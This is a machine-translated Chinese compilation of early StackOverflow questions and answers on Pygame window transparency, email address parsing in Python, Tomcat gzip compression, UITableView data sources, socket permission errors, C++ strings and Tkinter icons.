# StackOverflow 问答 000550000-000550999

# python - Pygame中完全透明的窗口？

> ID：550001
> 
> 赞同：8
> 
> 时间：2009-02-14T23:40:50.263
> 
> 标签：python, graphics, sdl, pygame

是否有可能在 Pygame 中获得一个完全透明的窗口（通过它查看桌面）？我已经找到了如何创建一个没有框架的窗口，但似乎没有任何明显的方法可以使它透明。

只要有适用于 Windows 和 Mac OS X 的解决方案，我就愿意与特定于系统的技术/框架联系起来，但我不确定要寻找哪个方向。

我能找到的唯一主题[推荐使用 wxPython](https://stackoverflow.com/questions/396791/desktop-graphics-or-skinned-windows)，这不是我可以为这个特定项目做的事情（需要是 Pygame）。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2018-08-14T15:35:58.107

在 Windows 上，您可以创建纯色背景颜色，然后使用 Win32 API 函数设置窗口的透明度颜色[`SetLayeredWindowAttributes()`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms633540.aspx)。[（用pywin32](https://pypi.org/project/pywin32/)调用）

**代码：**

```
import pygame
import win32api
import win32con
import win32gui

pygame.init()
screen = pygame.display.set_mode((800, 600)) # For borderless, use pygame.NOFRAME
done = False
fuchsia = (255, 0, 128)  # Transparency color
dark_red = (139, 0, 0)

# Create layered window
hwnd = pygame.display.get_wm_info()["window"]
win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE,
                       win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_LAYERED)
# Set window transparency color
win32gui.SetLayeredWindowAttributes(hwnd, win32api.RGB(*fuchsia), 0, win32con.LWA_COLORKEY)

while not done:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            done = True

    screen.fill(fuchsia)  # Transparent background
    pygame.draw.rect(screen, dark_red, pygame.Rect(30, 30, 60, 60))
    pygame.display.update() 
```

**结果：**

[![透明的 Pygame 窗口](https://i.stack.imgur.com/OomQ0.png)](https://i.stack.imgur.com/OomQ0.png)

**解释：**

使用您的透明度颜色的窗口的任何部分都将完全透明。您可以查看位于游戏窗口后面的任何桌面图标或程序并与之交互。

要移除窗口边框，您可以将 Pygame 的显示模式设置为`NOFRAME`.

```
screen = pygame.display.set_mode((800, 600), pygame.NOFRAME) 
```

**也可以看看：**

*   堆栈溢出：[使用 Win32 使窗口透明？](https://stackoverflow.com/a/4550243/3357935)
*   堆栈溢出：[透明 hwnd 窗口](https://stackoverflow.com/q/23585212/3357935)
*   微软：[分层窗口](https://msdn.microsoft.com/en-us/library/ms997507.aspx)
*   微软：[SetLayeredWindowAttributes 函数](https://msdn.microsoft.com/en-us/library/ms633540.aspx)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-02-14T23:48:12.710

PyGame 使用 SDL，它不支持透明窗口。尽管至少在 Linux 上使其透明是由窗口管理器完成的，而不是应用程序。

# c# - HTML文本没有格式化

> ID：550006
> 
> 赞同：2
> 
> 时间：2009-02-14T23:46:34.057
> 
> 标签：c#, .net, sql, html

所以我在我的数据库中存储了 HTML 格式的 Sql 文本，我`<p></p>`在页面加载时用它填充标签的内容，但是虽然 HTML 标签显示在文本中，但它们并没有格式化文本。我缺少一个步骤吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-14T23:56:12.693

那么你是如何输出 HTML 的呢？你有一个在服务器上运行的 HtmlGenericControl 代表 <p> 标签？也许您使用 InnerText 而不是 InnerHtml？或者，它可能是 HTML 编码/解码问题。看一下 HTML 源代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-14T23:53:10.233

显示时对存储的文本使用“html_entity_decode($str)”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T00:03:23.440

当您说您正在“填充`<p></p>`标签的内容”时 - 您究竟是什么意思？通常，我看到的选择是 A) 使用标签并分配文本字段或 B) 只需在您希望 HTML 出现的位置直接输入字符串值。

```
<%#StringToWriteToHTMLStream%> 
```

从数据库记录中设置字符串内容后，您需要调用 Databind()。

这就是你所追求的吗？

# python - 从电子邮件文本中解析“发件人”地址

> ID：550009
> 
> 赞同：15
> 
> 时间：2009-02-14T23:49:22.177
> 
> 标签：python, string, email, parsing, text

我正在尝试从电子邮件的纯文本副本中提取电子邮件地址。我拼凑了一些代码来自己查找地址，但我不知道如何区分它们；现在它只是吐出文件中的所有电子邮件地址。我想让它只吐出以“发件人：”和几个通配符开头并以“>”结尾的地址（因为电子邮件设置为发件人 [name]<[email]> ）。

这是现在的代码：

```
import re #allows program to use regular expressions
foundemail = []
#this is an empty list

mailsrch = re.compile(r'[\w\-][\w\-\.]+@[\w\-][\w\-\.]+[a-zA-Z]{1,4}')
 #do not currently know exact meaning of this expression but assuming
 #it means something like "[stuff]@[stuff][stuff1-4 letters]"

        # "line" is a variable is set to a single line read from the file
# ("text.txt"):
for line in open("text.txt"):

    foundemail.extend(mailsrch.findall(line))

    # this extends the previously named list via the "mailsrch" variable
      #which was named before

print foundemail 
```

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2009-02-15T00:15:07.297

试试这个：

```
>>> from email.utils import parseaddr

>>> parseaddr('From: vg@m.com')
('', 'vg@m.com')

>>> parseaddr('From: Van Gale <vg@m.com>')
('Van Gale', 'vg@m.com')

>>> parseaddr('    From: Van Gale <vg@m.com>   ')
('Van Gale', 'vg@m.com')

>>> parseaddr('blah abdf    From: Van Gale <vg@m.com>   and this')
('Van Gale', 'vg@m.com') 
```

不幸的是，它只在每一行中找到第一封电子邮件，因为它需要标题行，但也许没关系？

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-02-15T01:14:59.960

```
import email
msg = email.message_from_string(str)

# or
# f = open(file)
# msg = email.message_from_file(f)

msg['from']

# and optionally
from email.utils import parseaddr
addr = parseaddr(msg['from']) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-02-15T00:20:01.450

如果您的目标实际上是从文本中提取电子邮件地址，您应该使用为此目的构建的库。正则表达式不太适合匹配任意电子邮件地址。

但是，如果您这样做是为了更好地理解正则表达式，我会采取扩展您正在使用的表达式以包含您想要匹配的额外文本的方法。所以首先，让我解释一下这个正则表达式的作用：

```
[\w\-][\w\-\.]+@[\w\-][\w\-\.]+[a-zA-Z]{1,4} 
```

*   `[\w\-]`匹配任何“单词”字符（字母、数字或下划线）*或*连字符
*   `[\w\-\.]+`匹配（任何单词字符*或*连字符*或*句点）一次或多次
*   `@`匹配文字“@”
*   `[\w\-]`匹配任何单词字符*或*连字符
*   `[\w\-\.]+`匹配（任何单词字符*或*连字符*或*句点）一次或多次
*   `[a-zA-Z]{1,4}`匹配 1、2、3 或 4 个小写或大写字母

因此，这匹配一个“单词”序列，该序列可能包含连字符或句点，但不以句点开头，后跟一个`@`符号，然后是另一个以字母结尾的“单词”（与之前的含义相同）。

现在，为了满足您的目的修改它，让我们添加正则表达式部分以匹配“From”、名称和尖括号：

```
From: [\w\s]+?<([\w\-][\w\-\.]+@[\w\-][\w\-\.]+[a-zA-Z]{1,4})> 
```

*   `From:`匹配文字文本“From:”
*   `[\w\s]+?`匹配一个或多个连续的单词字符*或*空格字符。问号使匹配不贪婪，因此它将匹配尽可能少的字符，同时仍然允许整个正则表达式匹配（在这种情况下，可能没有必要，但它确实使匹配更有效，因为紧随其后的不是单词字符或空格字符）。
*   `<`匹配文字小于号（左尖括号）
*   您之前使用的相同正则表达式现在被括号括起来。这使它成为一个*捕获组*，因此您可以调用`m.group(1)`以获取与正则表达式的该部分匹配的文本。
*   `>`匹配文字大于号

由于正则表达式现在使用捕获组，因此您的代码也需要稍作更改：

```
import re
foundemail = []

mailsrch = re.compile(r'From: [\w\s]+?<([\w\-][\w\-\.]+@[\w\-][\w\-\.]+[a-zA-Z]{1,4})>')

for line in open("text.txt"):
    foundemail.extend([m.group(1) for m in mailsrch.finditer(line)])

print foundemail 
```

该代码`[m.group(1) for m in mailsrch.finditer(line)]`根据正则表达式找到的每个匹配项从第一个捕获组（请记住，这是括号中的部分）中生成一个列表。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-15T00:37:27.103

```
mailsrch = re.compile(r'[\w\-][\w\-\.]+@[\w\-][\w\-\.]+[a-zA-Z]{1,4}') 
```

表达式分解：

`[\w-]`：任何单词字符（字母数字，加下划线）或破折号

`[\w-.]+`：任何单词字符、破折号或句点/点，一次或多次

`@`：文字@符号

`[\w-][\w-.]+`: 任何单词 char 或 dash，后跟任何单词 char、dash 或句点一次或多次。

`[a-zA-Z]{1,4}`: 任意字母字符 1-4 次。

要使此匹配仅以 , 开头`From:`并包含在 < 和 > 符号中的行：

```
import re

foundemail = []
mailsrch = re.compile(r'^From:\s+.*<([\w\-][\w\-\.]+@[\w\-][\w\-\.]+[a-zA-Z]{1,4})>', re.I | re.M)
foundemail.extend(mailsrch.findall(open('text.txt').read()))

print foundemail 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-02-15T00:52:29.077

使用电子邮件和邮箱包来解析电子邮件的纯文本版本。这会将其转换为能够提取“发件人”字段中的所有地址的对象。

如果您需要处理其他头字段或消息正文，您还可以对消息进行大量其他分析。

作为一个简单的示例，以下（未经测试的）代码应该读取 unix 样式邮箱中的所有邮件，并打印所有“发件人”标头。

```
import mailbox
import email

mbox = mailbox.PortableUnixMailbox(open(filename, 'rU'), email.message_from_file)

for msg in mbox:
   from = msg['From']
   print from 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-02-15T01:39:29.997

粗略地说，您可以：

```
from email.utils import parseaddr

foundemail = []
for line in open("text.txt"):
    if not line.startswith("From:"): continue
    n, e = parseaddr(line)
    foundemail.append(e)
print foundemail 
```

这利用内置的 python parseaddr 函数来解析地址之外的地址（如其他答案所示），而无需解析整个消息的开销（例如，通过使用功能更全面的电子邮件和邮箱包）。此处的脚本只是跳过任何不以“From:”开头的行。开销对您来说是否重要取决于您的输入有多大以及您执行此操作的频率。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-02-14T23:59:11.407

如果您可以合理地确定包含这些电子邮件地址的行以空格开头，后跟“发件人：”，您可以简单地执行以下操作：

```
addresslines = []
for line in open("text.txt"):
    if line.strip().startswith("From:"):
        addresslines.append(line) 
```

然后稍后 - 或将它们添加到列表中 - 您可以优化地址行项目以准确给出您想要的内容

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-02-15T00:13:05.960

"[stuff]@[stuff][stuff1-4 letters]" 差不多，但如果你愿意，你可以使用我刚刚发现的技巧来解码正则表达式，[here](https://stackoverflow.com/questions/101268/hidden-features-of-python)。在交互式 Python 会话中执行 compile()，如下所示：

```
mailsrch = re.compile(r'[\w\-][\w\-\.]+@[\w\-][\w\-\.]+[a-zA-Z]{1,4}', 128) 
```

它将打印出以下内容：

```
in 
  category category_word
  literal 45
max_repeat 1 65535 
  in 
    category category_word
    literal 45
    literal 46
literal 64 
in 
  category category_word
  literal 45
max_repeat 1 65535 
  in 
    category category_word
    literal 45
    literal 46
max_repeat 1 4 
  in 
    range (97, 122)
    range (65, 90) 
```

如果你能习惯它，它会向你展示 RE 的工作原理。

# java - Tomcat 压缩不添加 Content-Encoding: gzip in the Header

> ID：550024
> 
> 赞同：14
> 
> 时间：2009-02-15T00:06:14.213
> 
> 标签：java, tomcat, gzip, yslow

我正在使用 Tomcat 来压缩我的 HTML 内容，如下所示：

```
<Connector port="8080" maxHttpHeaderSize="8192"
maxProcessors="150" maxThreads="150" minSpareThreads="25"
maxSpareThreads="75" enableLookups="false" redirectPort="8443"
acceptCount="150" connectionTimeout="20000" disableUploadTimeout="true"
compression="on" compressionMinSize="128" noCompressionUserAgents="gozilla, traviata"
compressableMimeType="text/html"
URIEncoding="UTF-8" /> 
```

但是，在 HTTP 标头（通过 YSlow 观察到）中，我没有看到

```
Content-Encoding: gzip 
```

导致 YSlow 得分不佳。

我所看到的只是

```
HeadersPost
Response Headers
Server: Apache-Coyote/1.1
Content-Type:   text/html;charset=ISO-8859-1
Content-Language:   en-US
Content-Length: 5251
Date:   Sat, 14 Feb 2009 23:33:51 GMT 
```

我正在运行 apache mod_jk Tomcat 配置。

如何使用 Tomcat 压缩 HTML 内容，并在标题中添加“Content-Encoding: gzip”？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-04T17:16:03.117

看一下[http://sourceforge.net/projects/pjl-comp-filter/](http://sourceforge.net/projects/pjl-comp-filter/)。

其他自定义解决方案可能存在内存泄漏。

此外，如果您使用的是 mod_jk，那么您肯定不会为这些请求使用 8080 连接器（支持压缩）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-08-11T13:43:48.977

Tomcat 将进行压缩。但是，因为您使用的是`mod_jk`我猜您是通过 Apache 在端口 80 而不是 tomcat 在端口上获取请求`8080`。作为一个实验，尝试通过端口 8080 获取您的页面，然后检查`yslow`您是否应该看到正确的标题。

我认为正在发生的事情是 apache 正在解压缩从 tomcat 获取的内容，`mod_jk`然后将压缩的内容传递给浏览器。

如果您想使用`mod_jk`，则需要在 Apache 而不是 Tomcat 上设置压缩。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T19:22:31.660

也许Tomcat所指的压缩不是gzip？这是在黑暗中的刺，但它可能与空白压缩或线条修剪有关。

我想Tomcat在这方面会更加明确（希望如此）。

我们在我们的应用程序中运行了 duffmo 提到的 gzip 过滤器，web.xml 看起来像这样：

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app version="2.4" xmlns="http://java.sun.com/xml/ns/j2ee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee web-app_2_4.xsd">

    <display-name>App-Web</display-name>

    <!-- FILTERS -->

    <!-- Gzip filter -->
    <filter>
        <filter-name>GZIPFilter</filter-name>
        <filter-class>weblogicx.servlet.gzip.filter.GZIPFilter</filter-class>
    </filter>

    [snip]    
</web-app> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-03-02T19:21:16.690

我在这里查看了 Tomcat 文档：http: [//tomcat.apache.org/tomcat-5.5-doc/config/http.html](http://tomcat.apache.org/tomcat-5.5-doc/config/http.html)

它提到 using `compression="force"` which 对我有用。它还说你可以设置一个`minimum number`. 这对我来说很好

```
<Connector port="8080" compression="256000" /> 
```

（压缩超过 256Kb 的任何内容）

的默认值`compressableMimeType`意味着我不需要该属性。另请注意，它没有列出`CompressionMinSize`属性。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2011-03-31T12:59:02.207

要提高 J2EE Web 应用程序的整体客户端性能，您可以尝试 WebUtilities java 库。

> 这是链接 :: [http://code.google.com/p/webutilities/](http://code.google.com/p/webutilities/)。

它提供过滤器、标记、servlet 组件以应用各种客户端性能实践，从而针对 PageSpeed/YSlow 获得更高的性能评级。

从 0.0.4 版开始，它有助于遵循性能实践。

1.  最小化 HTTP 请求 - 可以在一个请求中提供多个 JS/CSS 文件
2.  客户端缓存 - 添加适当的 Cache-Control、Expires 标头
3.  动态 JS/CSS 缩小 - 使用 YUICompressor
4.  压缩 - 支持 gzip/deflate/compress 编码的 2way 压缩
5.  服务器上的响应缓存 - 避免重新处理未更改的资源
6.  添加字符编码 - 让浏览器提前知道

它还可以针对 MIME、URL 或用户代理进行高度可配置/定制。

# iphone - 苹果手机：TabView + TableView

> ID：550026
> 
> 赞同：7
> 
> 时间：2009-02-15T00:08:33.193
> 
> 标签：iphone, uitableview, uitabbarcontroller, datasource, delegates

我想我错过了一些简单的东西，但我无法弄清楚它到底是什么。

我正在尝试使用 设置一个应用程序`UITabViewController`，其中一个选项卡将有一个 UITableView 和 UISearchBar （但没有导航控制器）。我在界面生成器中设置了`UITabViewController`所有选项卡，并且视图位于它们自己的 xib 文件中。带有 的选项卡的 xib 文件`UITableView`设置和连接如下。

浏览器中的内容：文件的所有者（类是我的自定义类，它是 UITableViewController 的子类）视图 -> 视图

```
View (class UIView, reference view -> File's owner) contains:
      UITableView (if i try and set references to the data source / delegate, the app breaks)
      UISearchBar (unconfigured at the moment) 
```

此设置显示所有项目并且不会锁定，但是当我尝试使用 UITableView 加载选项卡时，我无法分配 DataSource 而不会崩溃。我应该怎么做才能将数据输入到这个表中，无论是在 IB 还是代码中？我的想法如下：

1.  实现自定义 UITableView 类，连接到 IB 中的表视图或 Xcode 中的自定义 tableviewcontroller。
2.  将头或笔记本电脑靠在墙上，直到它起作用。

更新：这是当我连接 Tableview 的数据源并委托给文件所有者（谁的类是我的自定义 tableviewcontroller）时模拟器推送到控制台的错误。

> 2/14/09 6:59:12 PM TabBarWillbeRight[33172] *** 由于未捕获的异常“NSInvalidArgumentException”而终止应用程序，原因：“*** -[UIViewController tableView:numberOfRowsInSection:]: 无法识别的选择器发送到实例 0x523760

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2010-01-22T08:52:06.090

我有一个带有相同错误消息的类似问题。简单的解决方案是在 IB 中单击 TabBarController 中的视图（显示“视图加载自..”的灰色矩形）并将元素的类更改为我的 TableViewController 的类名。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2011-05-15T15:43:16.600

我有同样的问题。1\. 确保您的视图实现数据源方法 2\. 在 IB 中，将视图的**类标识**设置为实现数据源方法的类。3\. 右键单击​​ IB 中的视图并检查数据源是否连接到**Files Owner**，而不是**View** ![在 IB 中连接 TableView](https://i.stack.imgur.com/OhRE4.png)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T00:12:08.410

如果您无法在不崩溃的情况下分配 DataSource，则表明某些 DataSource 委托方法尚未实现。

特别是您分配为数据源的类应该实现 UITableViewDataSource

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-15T14:34:17.577

你确定你的类实现了 UITableViewDelegate 和 UITableViewDataSource 类吗？还要检查您的视图控制器的声明。你的 .h 文件应该是这样的

```
@interface MyClass:UIViewController <UITableViewDelegate,UITableViewDataSource> 
```

其他一切似乎都已到位。如果类声明没有指定它实现 UITableViewDelegate 和 DataSource，那么你一设置数据源就会得到异常。

# python - 是什么导致 Python 套接字错误？

> ID：550032
> 
> 赞同：13
> 
> 时间：2009-02-15T00:12:53.387
> 
> 标签：python, sockets, permissions

```
 File "C:\Python25\lib\SocketServer.py", line 330, in __init__
    self.server_bind()
  File "C:\Python25\lib\BaseHTTPServer.py", line 101, in server_bind
    SocketServer.TCPServer.server_bind(self)
  File "C:\Python25\lib\SocketServer.py", line 341, in server_bind
    self.socket.bind(self.server_address)
  File "<string>", line 1, in bind
socket.error: (10013, 'Permission denied') 
```

我尝试启动 Google App Engine 开发服务器，并在我第一次尝试运行它时收到此错误。有任何想法吗？我是 python 新手。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2009-02-15T00:14:39.917

您可能正在尝试在当前用户帐户无权绑定到的端口上运行。这可能是端口 80 或其他东西。尝试增加端口号或使用具有足够权限的用户。

希望这可以帮助

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-07-04T19:24:57.947

> 我想知道为什么错误不是“端口已在使用”。我有点知道答案，但我不需要使用 SO 来知道它。:) – 奥斯卡雷耶斯 5 月 13 日 19:09

该端口未使用，（在 UNIX 中）您需要成为超级用户才能侦听任何 < 1024 的端口。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-12-22T00:01:43.557

我假设您正在使用 gae sdk 分配的默认端口，因此您可能希望确保它不被任何其他程序使用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-09-22T19:57:26.300

按如下方式运行。这应该工作

```
python -m 8888 
```

如果这不起作用。尝试其他数字，例如 8080。

# c++ - 向量 或矢量 ?

> ID：550035
> 
> 赞同：5
> 
> 时间：2009-02-15T00:15:02.960
> 
> 标签：c++, string, visual-studio-2008, pointers, char

**问题：**

*   有什么**区别**：

    *   `vector<string>`和`vector<char *>`？
*   我如何将 data type: 的值传递`string`给一个专门接受的函数：

    *   `const char *`?

例如：**_**

```
 vector<string> args(argv, argv + argc);

 vector<string>::iterator i;

 void foo (const char *); //*i 
```

*   我理解使用`vector<char *>`：我必须复制数据以及指针

### 编辑：

感谢您的输入！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2009-02-15T00:22:45.280

这实际上与向量无关。

A`char*`是一个指针，它可能指向也可能不指向有效的字符串数据。

A[`std::string`](http://en.cppreference.com/w/cpp/string/basic_string)是一个字符串类，封装了构成字符串的所有必需数据，以及分配和解除分配功能。

如果您将`std::string`'s 存储在向量中或其他任何地方，那么一切都会*正常工作*。

如果存储 char 指针，则必须完成分配和释放内存的所有艰苦工作，并确保指针只指向有意义的字符串数据，并确定字符串的长度等等。

由于`char*`许多 C API 以及 C++ 标准库的一部分都期望使用 '，因此`string`该类具有`c_str()`返回`char*`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-15T00:20:11.090

要将 a 传递`string`给 expecting `const char *`，请使用`string`'`c_str()`成员，该成员返回一个以 null 结尾的字符串：

```
string s = "foobar";

int n = strlen( s.c_str() ); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2010-12-21T07:48:59.360

`char*`实际上是一个指向 type 值的指针`char`，它定义了该值可以做什么和不能做什么。您可以创建一个`int* number`并`number`引用指向存储该值的内存块的指针，并假设它是一个`int`并且将锁定该内存块的该类型。但是您可以将 a 存储`char` `'C'`在该内存块中，但它会引发编译错误，因为它说您无法在该内存块`int`上执行这些功能`char`。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-15T00:18:29.753

```
foo(i->c_str()); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-15T00:20:31.417

来自[http://www.cplusplus.com/reference/string/string/](http://www.cplusplus.com/reference/string/string/)：

> 字符串对象是一种特殊类型的容器，专门设计用于处理字符序列。
> 
> 与传统的 C 字符串不同，C 字符串对象只是内存数组中的字符序列，C++ 字符串对象属于一个类，它具有许多内置功能，可以以更直观的方式对字符串进行操作，并且具有 C++ 容器常见的一些附加有用功能。

`char*`是一个字符的指针，仅此而已。

您可以使用`c_str()`传递所需的数据作为`const char*`。

至于复制，如果您复制数据，您将有一个新的字符串位置，因此会有一个新的指针。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-02-15T00:27:35.767

我会使用`vector< string >`，只是因为查找将基于价值而不是基于地址。但是，`vector< char* >`会更快，因此每个都有其优点。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-03-21T09:01:25.730

`vector<char *>` 听起来是个坏主意！！除非您的程序在内存有限的系统中运行。

> ID：550038
> 
> 赞同：
> 
> 时间：
> 
> 标签：

None

# javascript - 专注于非输入/锚元素？

> ID：550049
> 
> 赞同：10
> 
> 时间：2009-02-15T00:24:41.780
> 
> 标签：javascript, html, dom

我正在研究一些需要能够获得焦点的标签的 JavaScript。我希望能够使用`<div />`标签，但是`<div />`标签无法获得焦点。

看起来唯一可以获得焦点的元素是`<input />`标签和`<a />`标签。有没有其他方法可以让元素获得不是`<input />`或`<a />`标签的焦点？

我不能使用`<a />`or`<input />`标记，因为我需要能够将内容放置在标记内，因此这些标记都不起作用，除非有办法允许嵌套`<a />`标记，尽管我对此表示怀疑，因为这[违反了标准](http://www.w3.org/TR/html4/struct/links.html#h-12.2.2). 我试图找出一种方法来允许`<div />`标签（或任何其他容器元素）获得焦点。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-02-15T01:22:37.243

“可以集中注意力”是什么意思？任何 DOM 元素都可以设置为接收大量 javascript 事件，包括`click`事件。

或者你的意思是“可以用键盘标签”？如果是这样，并且您不能将`a`标签用作容器，请尝试使用元素上的[`tabindex`属性](http://snook.ca/archives/accessibility_and_usability/elements_focusable_with_tabindex/)。我不确定它是如何跨浏览器的，但至少在自己用 javascript 编写标签式 ui 之前尝试一下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T00:29:53.047

书签是要走的路。

开始你的内容

```
<a href="#anchor"> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T00:34:36.797

有点解决方法，在语义上不正确，但是......

```
a#foo { display: block; }
a#foo:hover { cursor: default; } 
```

然后使用JavaScript拦截onClick事件`a#foo`并返回false。

# python - 删除 Tkinter 窗口上的 TK 图标

> ID：550050
> 
> 赞同：26
> 
> 时间：2009-02-15T00:27:10.230
> 
> 标签：python, python-3.x, tkinter, tk

如何从其窗口的标题栏中删除 tkinter 图标

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2009-04-16T04:11:48.620

### 在 Windows 上

**第一步：**

使用图标编辑器或类似[rw-designer](http://www.rw-designer.com/online_icon_maker.php)的网站创建透明图标。将其另存为`transparent.ico`.

**第二步：**

```
from tkinter import *

tk = Tk()
tk.iconbitmap(default='transparent.ico')
lab = Label(tk, text='Window with transparent icon.')
lab.pack()
tk.mainloop() 
```

### 在 Unix 上

类似的东西，但使用一个`xbm`图标。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-08-16T15:48:34.300

类似于公认的答案（缺点是丑陋）：

```
import tkinter
import tempfile

ICON = (b'\x00\x00\x01\x00\x01\x00\x10\x10\x00\x00\x01\x00\x08\x00h\x05\x00\x00'
        b'\x16\x00\x00\x00(\x00\x00\x00\x10\x00\x00\x00 \x00\x00\x00\x01\x00'
        b'\x08\x00\x00\x00\x00\x00@\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        b'\x00\x01\x00\x00\x00\x01') + b'\x00'*1282 + b'\xff'*64

_, ICON_PATH = tempfile.mkstemp()
with open(ICON_PATH, 'wb') as icon_file:
    icon_file.write(ICON)

tk = tkinter.Tk()
tk.iconbitmap(default=ICON_PATH)
label = tkinter.Label(tk, text="Window with transparent icon.")
label.pack()

tk.mainloop() 
```

它只是动态创建文件，因此您不必携带额外的文件。使用相同的方法，您还可以为 Unix 制作一个“.xbm”图标。

编辑：感谢[@Magnus Hoff](https://stackoverflow.com/a/29509705/1546993)`ICON` ，可以进一步缩短：

```
import base64, zlib

ICON = zlib.decompress(base64.b64decode('eJxjYGAEQgEBBiDJwZDBy'
    'sAgxsDAoAHEQCEGBQaIOAg4sDIgACMUj4JRMApGwQgF/ykEAFXxQRc=')) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2016-06-01T10:47:50.427

根据之前的回复，我使用了这个解决方案：

```
from PIL import ImageTk
import zlib,base64
import Tkinter

icon=zlib.decompress(base64.b64decode('eJxjYGAEQgEBBiDJwZDBy'
'sAgxsDAoAHEQCEGBQaIOAg4sDIgACMUj4JRMApGwQgF/ykEAFXxQRc='))
root=Tkinter.Tk()
image=ImageTk.PhotoImage(data=icon)
root.tk.call('wm', 'iconphoto', root._w, image)
root.mainloop() 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-02-15T00:38:56.117

据我所知，最接近“空白”图标的是使用与窗口标题栏颜色相同的图标。但是话又说回来，很多用户使用不同的颜色主题，所以它不会很好。

但是，如果您使用 py2exe，则可以使用[Resource Hacker](http://angusj.com/resourcehacker/)之类的东西来交换图标。但是在python程序文本状态下，你能做的最好的就是替换。类似于 Jar 文件如何使用 java 图标，tkinter 应用程序将具有 TK 图标。毕竟......就像java一样，您的应用程序正在由中间程序翻译。由于另一个程序正在运行您的代码，因此您必须修改该其他程序。幸运的是，python/tk 在图标方面比 JVM 灵活一点，因此您可以替换图标。但完全删除它目前不是一种选择。

-约翰

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-10-14T15:02:10.467

替代@ubomb 的解决方案，通过利用`Tkinter.PhotoImage`对处理图像的内置支持来添加自定义`.gif`图像。

从文件：

`icon = Tkinter.PhotoImage(file="logo.gif")`

来自base64：

`gif_base64_string = """ R0lGODdhEAAQAIcAAAAAAAEBAQICAgMDAwQEBAUFBQYGBgcHBwgICAkJCQoKCgsLCwwMDA0NDQ4O Dg8PDxAQEBERERISEhMTExQUFBUVFRYWFhcXFxgYGBkZGRoaGhsbGxwcHB0dHR4eHh8fHyAgICEh ... 4B8AAP9Ci/4HoLTpfwD+qV4NoHVAADs= """`

`icon = Tkinter.PhotoImage(data=gif_base64_string)`

访问下面提到的链接以获取更多详细信息：//effbot.org/tkinterbook/photoimage.htm

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-04-08T17:39:10.390

**更新：**

稍作修改的代码（`try`从句代替`if TkVersion`）在以下位置生成一个透明（否）图标：

Linux（薄荷 18.1），Python 2.7

Linux（薄荷 18.1），Python 3.5.1

视窗 10，Python 2.7.13

它会在以下位置产生一个黑色图标（不起作用）：

视窗 8.1、Python 3.6

一个相当老的问题，但解决方案对我不起作用。我找到了一个部分简单的解决方案，还有一个我自己的后续问题。

部分解决方案（Tk 8.5，见下文） - 使用 PhotoImage 的`blank()`方法：

```
from Tkinter import *

root=Tk()

icon=PhotoImage(height=16, width=16)
icon.blank()

root.tk.call('wm', 'iconphoto', self.master._w, icon)

root.mainloop() 
```

在 Python 2.7、Windows 10 上，这可以正常工作，为您的新应用程序生成所需的“无图标”。

但是，在 Python 3.6、Win 8.1 上，这会阻塞 GUI，我认为这与较新的 Tk 8.6 有关，尽管我发现新的 8.6 使用符号`wm_iconphoto()`在这种情况下确实通过了：

```
try:
    from tkinter import *
except:
    from Tkinter import * 

root=Tk()

#Identical for Py2.7/Tk8.5 and Py3.5/Tk8.6
icon=PhotoImage(height=16, width=16)
icon.blank()

#Picking a notaion based on Tk version to avoid jamming
try:
    root.wm_iconphoto('True', icon)   #New Tk 8.6 style        
else:
    #Jams Python 3.5 with Tk 8.6 on Windows
    root.tk.call('wm', 'iconphoto', self.master._w, icon)   

root.mainloop() 
```

它会在 3.6 上生成一个黑色图标，而不是在 2.7/8.5 的情况下是透明图标。

可能有一种方法可以使用“透明度集”一个一个地设置像素透明 - [http://wiki.tcl.tk/1449](http://wiki.tcl.tk/1449)

